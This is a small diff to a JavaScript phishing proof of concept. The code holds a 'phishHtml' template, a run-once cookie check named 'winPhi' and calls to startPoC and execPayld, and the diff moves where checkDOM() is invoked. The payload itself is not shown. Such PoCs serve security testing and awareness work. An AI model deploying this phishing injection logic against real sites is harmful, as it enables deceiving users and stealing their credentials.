@@ -1,4 +1,3 @@
-window.history.pushState(null, null, window.location.href.split('#')[0]);
 let runOnce = false;
 const phishHtml = `
 <style>
@@ -106,7 +105,6 @@ function checkDOM() {
     startPoC();
   }
 }
-checkDOM();
 function startPoC() {
   // [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
   if ((runOnce) && !(/^(.*;)?\s*winPhi\s*=\s*[^;]/.test(document.cookie))) {
@@ -121,4 +119,5 @@ function startPoC() {
     execPayld();
   }
 }
+checkDOM();
 // EoF
